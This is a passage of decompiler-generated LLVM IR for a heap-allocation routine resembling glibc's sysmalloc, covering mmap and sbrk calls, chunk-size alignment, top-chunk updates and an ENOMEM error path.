  store i32 %v1_805f124, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %edx.global-to-local, align 4
  store i32 %v1_805f124, i32* @ebx, align 4
  %v10_805f131 = icmp eq i32 %v1_805f124, -1
  %v1_805f134 = icmp eq i1 %v10_805f131, false
  br i1 %v1_805f134, label %dec_label_pc_805f18c, label %dec_label_pc_805f120.dec_label_pc_805f136_crit_edge

dec_label_pc_805f120.dec_label_pc_805f136_crit_edge: ; preds = %dec_label_pc_805f120
  %v0_805f136.pre = load i8, i8* @global_var_807e480.783, align 128
  br label %dec_label_pc_805f136

dec_label_pc_805f136:                             ; preds = %dec_label_pc_805f120.dec_label_pc_805f136_crit_edge, %dec_label_pc_805f10c
  %v0_805f162 = phi i32 [ -1, %dec_label_pc_805f120.dec_label_pc_805f136_crit_edge ], [ %v1_805f114, %dec_label_pc_805f10c ]
  %v0_805f136 = phi i8 [ %v0_805f136.pre, %dec_label_pc_805f120.dec_label_pc_805f136_crit_edge ], [ %v0_805f101, %dec_label_pc_805f10c ]
  %v1_805f136 = urem i8 %v0_805f136, 2
  %v2_805f136 = icmp eq i8 %v1_805f136, 0
  br i1 %v2_805f136, label %dec_label_pc_805f136.dec_label_pc_805f14b_crit_edge, label %dec_label_pc_805f13f

dec_label_pc_805f136.dec_label_pc_805f14b_crit_edge: ; preds = %dec_label_pc_805f136
  %v0_805f14b.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805f14b

dec_label_pc_805f13f:                             ; preds = %dec_label_pc_805f136
  %v2_805f143 = add i32 %v1_805f0f8, %v1_805f018
  store i32 %v2_805f143, i32* %eax.global-to-local, align 4
  %v0_805f145 = load i32, i32* @esi, align 4
  %v2_805f145 = add i32 %v0_805f145, %v2_805f143
  %v5_805f147 = and i32 %v2_805f145, %v1_805f114
  store i32 %v5_805f147, i32* @esi, align 4
  br label %dec_label_pc_805f14b

dec_label_pc_805f14b:                             ; preds = %dec_label_pc_805f136.dec_label_pc_805f14b_crit_edge, %dec_label_pc_805f13f
  %v0_805f14b = phi i32 [ %v0_805f14b.pre, %dec_label_pc_805f136.dec_label_pc_805f14b_crit_edge ], [ %v5_805f147, %dec_label_pc_805f13f ]
  %tmp130 = icmp ult i32 %v0_805f14b, 1048576
  br i1 %tmp130, label %dec_label_pc_805f153, label %dec_label_pc_805f158

dec_label_pc_805f153:                             ; preds = %dec_label_pc_805f14b
  store i32 1048576, i32* @esi, align 4
  br label %dec_label_pc_805f158

dec_label_pc_805f158:                             ; preds = %dec_label_pc_805f14b, %dec_label_pc_805f153
  %v0_805f16c = phi i32 [ %v0_805f14b, %dec_label_pc_805f14b ], [ 1048576, %dec_label_pc_805f153 ]
  %tmp137 = icmp ugt i32 %v0_805f16c, %v1_805f042
  br i1 %tmp137, label %dec_label_pc_805f162, label %dec_label_pc_805f39a

dec_label_pc_805f162:                             ; preds = %dec_label_pc_805f158
  store i32 0, i32* %stack_var_-92, align 4
  %v8_805f16f = call i32 @mmap(i32 0, i32 %v0_805f16c, i32 3, i32 34, i32 0, i32 0, i32 %v0_805f162, i32 %v0_805f162)
  store i32 %v8_805f16f, i32* %eax.global-to-local, align 4
  store i32 %v8_805f16f, i32* @ebx, align 4
  %v10_805f179 = icmp eq i32 %v8_805f16f, -1
  br i1 %v10_805f179, label %dec_label_pc_805f39a, label %dec_label_pc_805f182

dec_label_pc_805f182:                             ; preds = %dec_label_pc_805f162
  %v0_805f182 = load i8, i8* @global_var_807e480.783, align 1
  %v2_805f182 = and i8 %v0_805f182, -2
  store i8 %v2_805f182, i8* @global_var_807e480.783, align 128
  %v1_805f189 = load i32, i32* @esi, align 4
  %v2_805f189 = add i32 %v1_805f189, %v8_805f16f
  store i32 %v2_805f189, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805f18c

dec_label_pc_805f18c:                             ; preds = %dec_label_pc_805f120, %dec_label_pc_805f182
  %v0_805f253 = phi i32 [ -1, %dec_label_pc_805f120 ], [ %v2_805f189, %dec_label_pc_805f182 ]
  %v0_805f261 = phi i32 [ %v1_805f124, %dec_label_pc_805f120 ], [ %v8_805f16f, %dec_label_pc_805f182 ]
  %v10_805f18c = icmp eq i32 %v0_805f261, -1
  br i1 %v10_805f18c, label %dec_label_pc_805f39a, label %dec_label_pc_805f195

dec_label_pc_805f195:                             ; preds = %dec_label_pc_805f18c
  %v0_805f199 = load i32, i32* @global_var_807e488.780, align 8
  %v1_805f199 = load i32, i32* @esi, align 4
  %v2_805f199 = add i32 %v1_805f199, %v0_805f199
  store i32 %v2_805f199, i32* @global_var_807e488.780, align 8
  %v2_805f19f = add i32 %v1_805f0f8, %v0_805f0e5
  store i32 %v2_805f19f, i32* %ecx.global-to-local, align 4
  %v2_805f1a1 = sub i32 %v0_805f261, %v2_805f19f
  %v7_805f1a1 = icmp ult i32 %v0_805f261, %v2_805f19f
  %v12_805f1a1 = icmp eq i32 %v2_805f1a1, 0
  %v1_805f1a3 = icmp eq i1 %v12_805f1a1, false
  br i1 %v1_805f1a3, label %dec_label_pc_805f1bc, label %dec_label_pc_805f1a5

dec_label_pc_805f1a5:                             ; preds = %dec_label_pc_805f195
  %v10_805f1a5 = icmp eq i32 %v0_805f253, -1
  %v1_805f1a8 = icmp eq i1 %v10_805f1a5, false
  br i1 %v1_805f1a8, label %dec_label_pc_805f1bc, label %dec_label_pc_805f1aa

dec_label_pc_805f1aa:                             ; preds = %dec_label_pc_805f1a5
  %v2_805f1aa = add i32 %v1_805f199, %v1_805f0f8
  store i32 %v0_805f0e5, i32* %ecx.global-to-local, align 4
  %v1_805f1b1 = or i32 %v2_805f1aa, 1
  store i32 %v1_805f1b1, i32* %eax.global-to-local, align 4
  store i32 %v1_805f1b1, i32* %v2_805f0ee, align 4
  br label %dec_label_pc_805f2e9

dec_label_pc_805f1bc:                             ; preds = %dec_label_pc_805f1a5, %dec_label_pc_805f195
  %v0_805f1bc = load i8, i8* @global_var_807e480.783, align 1
  %v1_805f1bc = sext i8 %v0_805f1bc to i32
  store i32 %v1_805f1bc, i32* %eax.global-to-local, align 4
  %v2_805f1c1 = urem i8 %v0_805f1bc, 2
  %v3_805f1c1 = icmp eq i8 %v2_805f1c1, 0
  br i1 %v3_805f1c1, label %dec_label_pc_805f1d5, label %dec_label_pc_805f1c5

dec_label_pc_805f1c5:                             ; preds = %dec_label_pc_805f1bc
  br i1 %v2_805f0f8, label %dec_label_pc_805f1d5, label %dec_label_pc_805f1c9

dec_label_pc_805f1c9:                             ; preds = %dec_label_pc_805f1c5
  %v1_805f1cb = icmp eq i1 %v7_805f1a1, false
  br i1 %v1_805f1cb, label %dec_label_pc_805f1d5, label %dec_label_pc_805f1cd

dec_label_pc_805f1cd:                             ; preds = %dec_label_pc_805f1c9
  %v1_805f1cd = and i32 %v1_805f1bc, -2
  %v4_805f1cd = trunc i32 %v1_805f1cd to i8
  store i32 %v1_805f1cd, i32* %eax.global-to-local, align 4
  store i8 %v4_805f1cd, i8* @global_var_807e480.783, align 128
  br label %dec_label_pc_805f1d5

dec_label_pc_805f1d5:                             ; preds = %dec_label_pc_805f1c9, %dec_label_pc_805f1c5, %dec_label_pc_805f1bc, %dec_label_pc_805f1cd
  %v0_805f1d5 = phi i8 [ %v0_805f1bc, %dec_label_pc_805f1c9 ], [ %v0_805f1bc, %dec_label_pc_805f1c5 ], [ %v0_805f1bc, %dec_label_pc_805f1bc ], [ %v4_805f1cd, %dec_label_pc_805f1cd ]
  %v1_805f1d5 = urem i8 %v0_805f1d5, 2
  %v2_805f1d5 = icmp eq i8 %v1_805f1d5, 0
  br i1 %v2_805f1d5, label %dec_label_pc_805f253, label %dec_label_pc_805f1de

dec_label_pc_805f1de:                             ; preds = %dec_label_pc_805f1d5
  br i1 %v2_805f0f8, label %dec_label_pc_805f1ec, label %dec_label_pc_805f1e2

dec_label_pc_805f1e2:                             ; preds = %dec_label_pc_805f1de
  store i32 %v2_805f1a1, i32* %eax.global-to-local, align 4
  %v2_805f1e6 = add i32 %v2_805f199, %v2_805f1a1
  store i32 %v2_805f1e6, i32* @global_var_807e488.780, align 8
  br label %dec_label_pc_805f1ec

dec_label_pc_805f1ec:                             ; preds = %dec_label_pc_805f1de, %dec_label_pc_805f1e2
  %v1_805f1ee = urem i32 %v0_805f261, 8
  %v2_805f1ee = icmp eq i32 %v1_805f1ee, 0
  store i32 %v1_805f1ee, i32* %edx.global-to-local, align 4
  %v1_805f1f1 = icmp eq i1 %v2_805f1ee, false
  br i1 %v1_805f1f1, label %dec_label_pc_805f1f9, label %dec_label_pc_805f1f3

dec_label_pc_805f1f3:                             ; preds = %dec_label_pc_805f1ec
  store i32 %v0_805f261, i32* @edi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805f203

dec_label_pc_805f1f9:                             ; preds = %dec_label_pc_805f1ec
  %v2_805f1fe = sub nsw i32 8, %v1_805f1ee
  store i32 %v2_805f1fe, i32* %eax.global-to-local, align 4
  %v2_805f200 = add i32 %v2_805f1fe, %v0_805f261
  store i32 %v2_805f200, i32* @edi, align 4
  br label %dec_label_pc_805f203

dec_label_pc_805f203:                             ; preds = %dec_label_pc_805f1f3, %dec_label_pc_805f1f9
  %v0_805f206 = phi i32 [ 0, %dec_label_pc_805f1f3 ], [ %v2_805f1fe, %dec_label_pc_805f1f9 ]
  %v2_805f203 = add i32 %v1_805f199, %v0_805f261
  %v2_805f206 = add i32 %v0_805f206, %v1_805f0f8
  store i32 %v2_805f206, i32* %ecx.global-to-local, align 4
  %v2_805f20f = add i32 %v2_805f206, %v2_805f203
  store i32 %v2_805f20f, i32* %edx.global-to-local, align 4
  %v2_805f215 = add i32 %v2_805f20f, %v1_805f018
  %v5_805f218 = and i32 %v2_805f215, %v1_805f114
  %v2_805f21f = sub i32 %v5_805f218, %v2_805f20f
  store i32 %v2_805f21f, i32* %eax.global-to-local, align 4
  %v2_805f221 = add i32 %v2_805f21f, %v2_805f206
  store i32 %v2_805f221, i32* @esi, align 4
  store i32 %v2_805f221, i32* %stack_var_-92, align 4
  %v1_805f225 = call i32 @__GI_sbrk(i32 %v2_805f221)
  store i32 %v1_805f225, i32* %eax.global-to-local, align 4
  store i32 %v1_805f225, i32* %edx.global-to-local, align 4
  %v10_805f22f = icmp eq i32 %v1_805f225, -1
  %v1_805f232 = icmp eq i1 %v10_805f22f, false
  br i1 %v1_805f232, label %dec_label_pc_805f242, label %dec_label_pc_805f234

dec_label_pc_805f234:                             ; preds = %dec_label_pc_805f203
  store i32 0, i32* %stack_var_-92, align 4
  %v1_805f239 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_805f239, i32* %eax.global-to-local, align 4
  store i32 %v1_805f239, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805f276

dec_label_pc_805f242:                             ; preds = %dec_label_pc_805f203
  %v1_805f242 = load i32, i32* @ebx, align 4
  %v7_805f242 = icmp ult i32 %v1_805f225, %v1_805f242
  %v1_805f244 = icmp eq i1 %v7_805f242, false
  br i1 %v1_805f244, label %dec_label_pc_805f27b, label %dec_label_pc_805f246

dec_label_pc_805f246:                             ; preds = %dec_label_pc_805f242
  %v0_805f246 = load i8, i8* @global_var_807e480.783, align 1
  %v2_805f246 = and i8 %v0_805f246, -2
  store i8 %v2_805f246, i8* @global_var_807e480.783, align 128
  store i32 %v2_805f203, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805f25a

dec_label_pc_805f253:                             ; preds = %dec_label_pc_805f1d5
  %v10_805f253 = icmp eq i32 %v0_805f253, -1
  br i1 %v10_805f253, label %dec_label_pc_805f25e, label %dec_label_pc_805f258

dec_label_pc_805f258:                             ; preds = %dec_label_pc_805f253
  store i32 %v0_805f261, i32* @edi, align 4
  br label %dec_label_pc_805f25a

dec_label_pc_805f25a:                             ; preds = %dec_label_pc_805f246, %dec_label_pc_805f258
  %v0_805f27b49 = phi i32 [ %v2_805f203, %dec_label_pc_805f246 ], [ %v0_805f253, %dec_label_pc_805f258 ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_805f27b

dec_label_pc_805f25e:                             ; preds = %dec_label_pc_805f253
  store i32 %v0_805f261, i32* @edi, align 4
  store i32 0, i32* %stack_var_-92, align 4
  %v1_805f265 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_805f265, i32* %edx.global-to-local, align 4
  %v1_805f26c = load i32, i32* @ebx, align 4
  %v2_805f26c = sub i32 %v1_805f265, %v1_805f26c
  %v1_805f26e = load i32, i32* @esi, align 4
  %v2_805f26e = sub i32 %v2_805f26c, %v1_805f26e
  store i32 %v2_805f26e, i32* %eax.global-to-local, align 4
  %v0_805f270 = load i32, i32* @global_var_807e488.780, align 8
  %v2_805f270 = add i32 %v0_805f270, %v2_805f26e
  store i32 %v2_805f270, i32* @global_var_807e488.780, align 8
  br label %dec_label_pc_805f276

dec_label_pc_805f276:                             ; preds = %dec_label_pc_805f234, %dec_label_pc_805f25e
  %v0_805f27b48 = phi i32 [ %v1_805f239, %dec_label_pc_805f234 ], [ %v1_805f265, %dec_label_pc_805f25e ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_805f27b

dec_label_pc_805f27b:                             ; preds = %dec_label_pc_805f242, %dec_label_pc_805f25a, %dec_label_pc_805f276
  %v0_805f280 = phi i32 [ %v1_805f225, %dec_label_pc_805f242 ], [ %v0_805f27b49, %dec_label_pc_805f25a ], [ %v0_805f27b48, %dec_label_pc_805f276 ]
  %v10_805f27b = icmp eq i32 %v0_805f280, -1
  br i1 %v10_805f27b, label %dec_label_pc_805f2e9, label %dec_label_pc_805f280

dec_label_pc_805f280:                             ; preds = %dec_label_pc_805f27b
  %v1_805f280 = load i32, i32* @edi, align 4
  %v2_805f280 = sub i32 %v0_805f280, %v1_805f280
  store i32 %v2_805f280, i32* %edx.global-to-local, align 4
  store i32 %v1_805f280, i32* @global_var_807e14c.768, align 4
  %v1_805f288 = load i32, i32* @esi, align 4
  %v2_805f288 = add i32 %v1_805f288, %v2_805f280
  %v1_805f28b = or i32 %v2_805f288, 1
  store i32 %v1_805f28b, i32* %eax.global-to-local, align 4
  %v2_805f28e = add i32 %v1_805f280, 4
  %v3_805f28e = inttoptr i32 %v2_805f28e to i32*
  store i32 %v1_805f28b, i32* %v3_805f28e, align 4
  %v0_805f291 = load i32, i32* @global_var_807e488.780, align 8
  %v1_805f291 = load i32, i32* @esi, align 4
  %v2_805f291 = add i32 %v1_805f291, %v0_805f291
  store i32 %v2_805f291, i32* @global_var_807e488.780, align 8
  br i1 %v2_805f0f8, label %dec_label_pc_805f2e9, label %dec_label_pc_805f29b

dec_label_pc_805f29b:                             ; preds = %dec_label_pc_805f280
  %v1_805f29b = add i32 %v1_805f0f8, -12
  store i32 %v0_805f0e5, i32* @ecx, align 4
  %v1_805f2a2 = and i32 %v1_805f29b, -8
  store i32 %v1_805f2a2, i32* %eax.global-to-local, align 4
  %v1_805f2a7 = or i32 %v1_805f2a2, 1
  store i32 %v1_805f2a7, i32* %edx.global-to-local, align 4
  %v5_805f2aa = icmp ult i32 %v1_805f2a2, 15
  store i32 %v1_805f2a7, i32* %v2_805f0ee, align 4
  %v0_805f2b0 = load i32, i32* @ecx, align 4
  %v1_805f2b0 = load i32, i32* %eax.global-to-local, align 4
  %v2_805f2b0 = add i32 %v0_805f2b0, 4
  %v3_805f2b0 = add i32 %v2_805f2b0, %v1_805f2b0
  %v4_805f2b0 = inttoptr i32 %v3_805f2b0 to i32*
  store i32 5, i32* %v4_805f2b0, align 4
  %v0_805f2b8 = load i32, i32* @ecx, align 4
  %v1_805f2b8 = load i32, i32* %eax.global-to-local, align 4
  %v2_805f2b8 = add i32 %v0_805f2b8, 8
  %v3_805f2b8 = add i32 %v2_805f2b8, %v1_805f2b8
  %v4_805f2b8 = inttoptr i32 %v3_805f2b8 to i32*
  store i32 5, i32* %v4_805f2b8, align 4
  br i1 %v5_805f2aa, label %dec_label_pc_805f2e9, label %dec_label_pc_805f2c2

dec_label_pc_805f2c2:                             ; preds = %dec_label_pc_805f29b
  %v0_805f2c5 = load i32, i32* @ecx, align 4
  %v1_805f2c7 = add i32 %v0_805f2c5, 8
  store i32 %v1_805f2c7, i32* %eax.global-to-local, align 4
  %v0_805f2ca = load i32, i32* @global_var_807e464.784, align 4
  store i32 %v0_805f2ca, i32* @ebx, align 4
  store i32 %v1_805f2c7, i32* %stack_var_-92, align 4
  store i32 -1, i32* @global_var_807e464.784, align 4
  %v1_805f2db = call i32 @free(i32 %v1_805f2c7)
  store i32 %v1_805f2db, i32* %eax.global-to-local, align 4
  %v0_805f2e0 = load i32, i32* @ebx, align 4
  store i32 %v0_805f2e0, i32* @global_var_807e464.784, align 4
  br label %dec_label_pc_805f2e9

dec_label_pc_805f2e9:                             ; preds = %dec_label_pc_805f29b, %dec_label_pc_805f280, %dec_label_pc_805f27b, %dec_label_pc_805f1aa, %dec_label_pc_805f2c2
  %v0_805f2e9 = load i32, i32* @global_var_807e488.780, align 8
  store i32 %v0_805f2e9, i32* %eax.global-to-local, align 4
  %v1_805f2ee = load i32, i32* @global_var_807e48c.785, align 4
  %tmp138 = icmp ugt i32 %v0_805f2e9, %v1_805f2ee
  br i1 %tmp138, label %dec_label_pc_805f2f6, label %dec_label_pc_805f2fb

dec_label_pc_805f2f6:                             ; preds = %dec_label_pc_805f2e9
  store i32 %v0_805f2e9, i32* @global_var_807e48c.785, align 4
  br label %dec_label_pc_805f2fb

dec_label_pc_805f2fb:                             ; preds = %dec_label_pc_805f2e9, %dec_label_pc_805f2f6
  %v1_805f2fb = load i32, i32* @global_var_807e484.778, align 4
  %v2_805f2fb = add i32 %v1_805f2fb, %v0_805f2e9
  store i32 %v2_805f2fb, i32* %eax.global-to-local, align 4
  %v1_805f301 = load i32, i32* @global_var_807e494.781, align 4
  %tmp139 = icmp ugt i32 %v2_805f2fb, %v1_805f301
  br i1 %tmp139, label %dec_label_pc_805f309, label %dec_label_pc_805f30e

dec_label_pc_805f309:                             ; preds = %dec_label_pc_805f2fb
  store i32 %v2_805f2fb, i32* @global_var_807e494.781, align 4
  br label %dec_label_pc_805f30e

dec_label_pc_805f30e:                             ; preds = %dec_label_pc_805f2fb, %dec_label_pc_805f309
  %v0_805f30e = load i32, i32* @global_var_807e14c.768, align 4
  store i32 %v0_805f30e, i32* @ebx, align 4
  %v1_805f314 = add i32 %v0_805f30e, 4
  %v2_805f314 = inttoptr i32 %v1_805f314 to i32*
  %v3_805f314 = load i32, i32* %v2_805f314, align 4
  %v1_805f317 = and i32 %v3_805f314, -4
  store i32 %v1_805f317, i32* @ecx, align 4
  %v10_805f31a = icmp ult i32 %v1_805f317, %v1_805efb7
  br i1 %v10_805f31a, label %dec_label_pc_805f39a, label %dec_label_pc_805f320

dec_label_pc_805f320:                             ; preds = %dec_label_pc_805f30e
  store i32 %v1_805f042, i32* %esi.global-to-local, align 4
  %v2_805f326 = sub i32 %v1_805f317, %v1_805f042
  store i32 %v2_805f326, i32* %ecx.global-to-local, align 4
  %v2_805f328 = add i32 %v0_805f30e, %v1_805f042
  store i32 %v2_805f328, i32* %edx.global-to-local, align 4
  %v1_805f32b = or i32 %v1_805f042, 1
  store i32 %v1_805f32b, i32* %eax.global-to-local, align 4
  store i32 %v2_805f328, i32* @global_var_807e14c.768, align 4
  store i32 %v1_805f32b, i32* %v2_805f314, align 4
  %v0_805f337.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_805f337

dec_label_pc_805f337:                             ; preds = %dec_label_pc_805efc8, %dec_label_pc_805f320
  %v0_805f337 = phi i32 [ %v5_805efdb, %dec_label_pc_805efc8 ], [ %v0_805f337.pre, %dec_label_pc_805f320 ]
  %v1_805f337 = or i32 %v0_805f337, 1
  store i32 %v1_805f337, i32* @ecx, align 4
  %v0_805f33a = load i32, i32* @ebx, align 4
  %v1_805f33a = add i32 %v0_805f33a, 8
  store i32 %v1_805f33a, i32* @ebx, align 4
  %v1_805f33d = load i32, i32* %edx.global-to-local, align 4
  %v2_805f33d = add i32 %v1_805f33d, 4
  %v3_805f33d = inttoptr i32 %v2_805f33d to i32*
  store i32 %v1_805f337, i32* %v3_805f33d, align 4
  br label %dec_label_pc_805f3a7

dec_label_pc_805f342:                             ; preds = %dec_label_pc_805ed82
  %v5_805f348 = sub i32 %v1_805ed65, %v1_805f042
  store i32 %v5_805f348, i32* %eax.global-to-local, align 4
  %v2_805f34c = add i32 %v0_805ee30113, %v1_805f042
  store i32 %v2_805f34c, i32* %edx.global-to-local, align 4
  %v1_805f350 = or i32 %v1_805f042, 1
  store i32 %v2_805f34c, i32* @global_var_807e150.769, align 16
  store i32 %v1_805f350, i32* %v2_805ed5f, align 4
  %v0_805f35c = load i32, i32* %eax.global-to-local, align 4
  %v0_805f35e = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_805f35e, i32* @global_var_807e15c.786, align 4
  %v1_805f364 = or i32 %v0_805f35c, 1
  store i32 %v1_805f364, i32* @ecx, align 4
  store i32 %v0_805f35e, i32* @global_var_807e160.771, align 32
  %v1_805f36d = add i32 %v0_805f35e, 8
  %v2_805f36d = inttoptr i32 %v1_805f36d to i32*
  store i32 ptrtoint (i32* @global_var_807e154.770 to i32), i32* %v2_805f36d, align 4
  %v0_805f374 = load i32, i32* %edx.global-to-local, align 4
  %v1_805f374 = add i32 %v0_805f374, 12
  %v2_805f374 = inttoptr i32 %v1_805f374 to i32*
  store i32 ptrtoint (i32* @global_var_807e154.770 to i32), i32* %v2_805f374, align 4
  %v0_805f37b = load i32, i32* @ecx, align 4
  %v1_805f37b = load i32, i32* %edx.global-to-local, align 4
  %v2_805f37b = add i32 %v1_805f37b, 4
  %v3_805f37b = inttoptr i32 %v2_805f37b to i32*
  store i32 %v0_805f37b, i32* %v3_805f37b, align 4
  %v0_805f37e = load i32, i32* %eax.global-to-local, align 4
  %v1_805f37e = load i32, i32* %edx.global-to-local, align 4
  %v3_805f37e = add i32 %v1_805f37e, %v0_805f37e
  %v4_805f37e = inttoptr i32 %v3_805f37e to i32*
  store i32 %v0_805f37e, i32* %v4_805f37e, align 4
  br label %dec_label_pc_805f38c

dec_label_pc_805f383:                             ; preds = %dec_label_pc_805ed91
  store i32 %v1_805f042, i32* %ebx.global-to-local, align 4
  %v0_805f387 = load i32, i32* @ebp, align 4
  %v2_805f387 = or i32 %v1_805f042, 4
  %v3_805f387 = add i32 %v0_805f387, %v2_805f387
  %v4_805f387 = inttoptr i32 %v3_805f387 to i32*
  %v5_805f387 = load i32, i32* %v4_805f387, align 4
  %v6_805f387 = or i32 %v5_805f387, 1
  store i32 %v6_805f387, i32* %v4_805f387, align 4
  br label %dec_label_pc_805f38c

dec_label_pc_805f38c:                             ; preds = %dec_label_pc_805f342, %dec_label_pc_805f383
  %v0_805f38c = load i32, i32* @ebp, align 4
  %v1_805f38c = add i32 %v0_805f38c, 8
  store i32 %v1_805f38c, i32* @ebx, align 4
  br label %dec_label_pc_805f3a7

dec_label_pc_805f391:                             ; preds = %dec_label_pc_805ee81
  %v1_805f391 = load i32, i32* @ebx, align 4
  %v2_805f391 = add i32 %v0_805ee90, 4
  %v3_805f391 = add i32 %v2_805f391, %v1_805f391
  %v4_805f391 = inttoptr i32 %v3_805f391 to i32*
  %v5_805f391 = load i32, i32* %v4_805f391, align 4
  %v6_805f391 = or i32 %v5_805f391, 1
  store i32 %v6_805f391, i32* %v4_805f391, align 4
  br label %dec_label_pc_805f396

dec_label_pc_805f396:                             ; preds = %dec_label_pc_805ee99, %dec_label_pc_805f391
  %v0_805f396 = load i32, i32* @ecx, align 4
  store i32 %v0_805f396, i32* @ebx, align 4
  br label %dec_label_pc_805f3a7

dec_label_pc_805f39a:                             ; preds = %dec_label_pc_805f158, %dec_label_pc_805f30e, %dec_label_pc_805f18c, %dec_label_pc_805f162
  %v0_805f39a = load i32, i32* %stack_var_-92, align 4
  %v1_805f39a = call i32 @__errno_location(i32 %v0_805f39a)
  store i32 %v1_805f39a, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v1_805f3a1 = inttoptr i32 %v1_805f39a to i32*
  store i32 12, i32* %v1_805f3a1, align 4
  br label %dec_label_pc_805f3a7

dec_label_pc_805f3a7:                             ; preds = %dec_label_pc_805f396, %dec_label_pc_805f38c, %dec_label_pc_805f337, %dec_label_pc_805eff3, %dec_label_pc_805efa5, %dec_label_pc_805ed2c, %dec_label_pc_805f39a
  store i32 %v2_805ec63, i32* %eax.global-to-local, align 4
  store i32 %v2_805ec63, i32* %stack_var_-92, align 4
  %v3_805f3b0 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  store i32 %v3_805f3b0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805f3b8

dec_label_pc_805f3b8:                             ; preds = %dec_label_pc_805ec81, %dec_label_pc_805f3a7
  %v0_805f3bb = load i32, i32* @ebx, align 4
  store i32 %v0_805f3bb, i32* %eax.global-to-local, align 4
  %v2_805f3bd = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_805f3bd, i32* @ebx, align 4
  store i32 %v0_805ec50, i32* @esi, align 4
  store i32 %v0_805ec4f, i32* @edi, align 4
  store i32 %v0_805ec4e, i32* @ebp, align 4
  ret i32 %v0_805f3bb

; uselistorder directives
  uselistorder i32 %v0_805f37e, { 1, 0 }
  uselistorder i32 %v0_805f35e, { 1, 0, 2 }
  uselistorder i32 %v2_805f2fb, { 1, 0, 2 }
  uselistorder i32 %v0_805f2e9, { 1, 2, 0, 3 }
  uselistorder i32 %v0_805f280, { 1, 0 }
  uselistorder i32 %v2_805f26e, { 1, 0 }
  uselistorder i32 %v1_805f225, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_805f20f, { 1, 0, 2 }
  uselistorder i32 %v2_805f203, { 1, 2, 0 }
  uselistorder i32 %v2_805f1fe, { 1, 0, 2 }
  uselistorder i32 %v1_805f1ee, { 2, 1, 0 }
  uselistorder i8 %v0_805f1bc, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v2_805f19f, { 1, 0, 2 }
  uselistorder i32 %v0_805f261, { 4, 5, 2, 3, 6, 1, 8, 7, 0 }
  uselistorder i32 %v0_805f253, { 2, 0, 1 }
  uselistorder i32 %v8_805f16f, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_805f16c, { 1, 0 }
  uselistorder i32 %v0_805f14b, { 1, 0 }
  uselistorder i32 %v1_805f124, { 1, 0, 2, 3 }
  uselistorder i32 %v2_805f11c, { 2, 1, 0, 3 }
  uselistorder i32 %v1_805f114, { 0, 1, 4, 2, 3 }
  uselistorder i8 %v0_805f101, { 1, 0 }
  uselistorder i32 %v1_805f0f8, { 5, 0, 1, 2, 3, 4, 6, 7 }
  uselistorder i32 %v0_805f0e5, { 3, 4, 0, 2, 1 }
  uselistorder i32 %v2_805f0c9, { 1, 0, 2 }
  uselistorder i32 %v2_805f0b5, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_805f07e, { 1, 2, 0, 3 }
  uselistorder i32 %v1_805f072, { 2, 1, 0 }
  uselistorder i32 %v8_805f061, { 3, 2, 1, 0, 4, 5 }
  uselistorder i32 %v2_805f048, { 1, 0, 2 }
  uselistorder i32 %v0_805efe4, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_805efb7, { 2, 0, 1, 3 }
  uselistorder i32 %v0_805efad, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v0_805ef9f, { 1, 0 }
  uselistorder i32 %v1_805ef36, { 1, 0 }
  uselistorder i32 %v3_805ef2a, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v0_805ef3a, { 1, 0 }
  uselistorder i32 %v2_805ef24, { 3, 2, 1, 0 }
  uselistorder i32 %esi.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_805ef2112, { 1, 0 }
  uselistorder i32 %v2_805ef16, { 1, 0 }
  uselistorder i32 %v1_805eefa, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_805eef6, { 2, 1, 0 }
  uselistorder i32 %v1_805eef2, { 1, 0 }
  uselistorder i32 %v1_805eee6, { 2, 1, 0 }
  uselistorder i32 %v2_805eedc, { 1, 0 }
  uselistorder i32 %v1_805eed9, { 1, 2, 0 }
  uselistorder i32 %v4_805ee77, { 0, 6, 4, 5, 3, 2, 1 }
  uselistorder i32 %v0_805eec2, { 1, 0 }
  uselistorder i32 %v0_805ee90, { 1, 2, 0, 3 }
  uselistorder i32 %v3_805ee63, { 2, 0, 1, 3 }
  uselistorder i32 %v0_805ee30, { 1, 2, 0 }
  uselistorder i32 %v2_805ee14, { 1, 0 }
  uselistorder i32 %v1_805ee0a, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-64.1, { 1, 0 }
  uselistorder i32 %v0_805ee05.lcssa, { 1, 0 }
  uselistorder i32 %v3_805edf5, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v1_805edec, { 1, 0, 2 }
  uselistorder i32 %v3_805edcf, { 5, 1, 2, 3, 4, 0, 6, 7 }
  uselistorder i32 %v2_805edc8, { 1, 0, 2 }
  uselistorder i32 %v2_805edb0, { 2, 1, 0 }
  uselistorder i32 %v0_805ed9c, { 2, 1, 3, 0 }
  uselistorder i32 %v3_805ed62, { 1, 0, 2 }
  uselistorder i32 %v0_805ee30113, { 1, 0, 2, 3 }
  uselistorder i32 %v3_805ed0f, { 1, 0, 2 }
  uselistorder i32 %v2_805ed01, { 2, 1, 0 }
  uselistorder i32 %v2_805ecdc, { 2, 1, 0 }
  uselistorder i8 %v0_805ecaa, { 3, 1, 2, 0, 4 }
